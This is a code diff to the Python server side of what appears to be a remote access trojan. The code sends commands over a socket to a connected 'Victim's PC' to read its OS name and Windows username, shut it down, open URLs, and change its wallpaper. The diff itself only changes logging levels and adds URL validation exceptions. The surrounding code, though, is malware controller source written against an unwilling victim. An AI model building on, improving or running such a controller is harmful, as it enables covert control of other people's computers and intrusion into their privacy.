@@ -5,6 +5,7 @@ from typing import *
 import logging
 import sys
 import re
+from exceptions import *
 _VALID_URL_PATTERN=re.compile(r'^(?:http|ftp)s?://'r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'r'localhost|'r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'r'(?::\d+)?'r'(?:/?|[/?]\S+)$',re.IGNORECASE)
 logging.basicConfig(filename="logs.log",level=logging.INFO,format="[%(asctime)s] %(levelname)s - %(message)s",datefmt="%H:%M:%S")
 class Server():
@@ -42,17 +43,17 @@ class Server():
             elif choice==2:
                 self.c.send("os_name".encode())
                 print(self.c.recv(4096).decode())
-                logging.debug(self.c.recv(4096).decode())
+                logging.info(self.c.recv(4096).decode())
             # Windows Username
             elif choice==3:
                 self.c.send("windows_username".encode())
                 print(self.c.recv(4096).decode())
-                logging.debug(self.c.recv(4096).decode())
+                logging.info(self.c.recv(4096).decode())
             # Shutdown PC
             elif choice==4:
                 self.c.send("shutdown_pc".encode())
                 print(self.c.recv(4096).decode())
-                logging.debug(self.c.recv(4096).decode())
+                logging.info(self.c.recv(4096).decode())
             # Open URL
             elif choice==5:
                 _url=input("Enter The URL You Want To Open In Victim's PC : ")
@@ -60,8 +61,13 @@ class Server():
                     if i.string !="" or i.string is not None:
                         self.c.send(f"open_url {_url}".encode())
                         print(self.c.recv(1024).decode())
-                        logging.debug(self.c.recv(1024).decode())
+                        logging.info(self.c.recv(1024).decode())
                         break
+                else:
+                    if "http://" in _url or "https://" in _url:
+                        raise NotAValidURLException("The URL You Entered Was Invalid")
+                    else:
+                        raise NotAValidURLException("URL Must Start With http:// or https://")
             # Change Wallpaper
             elif choice==6:...
             elif choice==7:...
